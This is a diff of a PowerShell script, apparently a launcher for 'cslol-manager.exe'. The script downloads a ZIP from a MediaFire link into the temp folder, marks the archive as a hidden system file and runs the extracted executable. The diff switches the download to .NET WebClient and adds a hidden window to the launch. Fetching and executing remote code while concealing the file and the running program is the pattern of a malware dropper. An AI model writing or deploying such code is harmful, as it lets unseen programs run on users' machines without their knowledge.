@@ -1,14 +1,16 @@
-$zipUrl = "https://download1339.mediafire.com/9v13x3ppljjgHFu8L5S3UivV7kDfgUdynLCcU4-UZGbfQOfW4D1u-Gf82NCxlVGw1-wie46KhzwzzkmFqFD9Ee0uJosfGJb6AG1baRilGJ8FeCw8Tv34KZa459CC5CQJ7tc-n-D5kEalt3lHGbIW8PiiWfK1N1l5PkQ8lnSWhxzYkw/ymkoxyal6qydp9k/CSLOL.zip"
+$zipUrl = "https://download1339.mediafire.com/kiraeps89lggs-IpOQKET4Emrm6os_iDvmlX0bhFl3cut0YlbvHPOp87aT59V4RYtEFu2E1cdnwNYoZIx_2g0uYtYEksmXIm8iV1OnNTZ24M5lSQl_mF_7f_8v4Y7MNLUWiNTC4Nb_m43eNDiTQzd5JGl1KFhTjF_VzSCfHk52eNdA/ymkoxyal6qydp9k/CSLOL.zip"
 $exeName = "cslol-manager.exe"
 $tempFolder = [System.IO.Path]::GetTempPath()
 $zipFile = Join-Path $tempFolder "CSLOL.zip"
 $extractFolder = Join-Path $tempFolder "CSLOL"
 $exePath = Join-Path $extractFolder $exeName
 
-# Download using curl if the file doesn't exist
+# Download using .NET WebClient
 if (-Not (Test-Path $zipFile)) {
-    $curlPath = "C:\Windows\System32\curl.exe" # Path to curl executable
-    Start-Process -FilePath $curlPath -ArgumentList "-o `"$zipFile`" `"$zipUrl`"" -Wait
+    Write-Host "Baixando o arquivo..."
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($zipUrl, $zipFile)
+    $webClient.Dispose()
     & attrib +h +s $zipFile
 }
 
@@ -26,5 +28,5 @@ foreach ($file in $files) {
 
 # Start the executable
 if (Test-Path $exePath) {
-    Start-Process -FilePath $exePath
+    Start-Process -FilePath $exePath -WindowStyle Hidden
 }
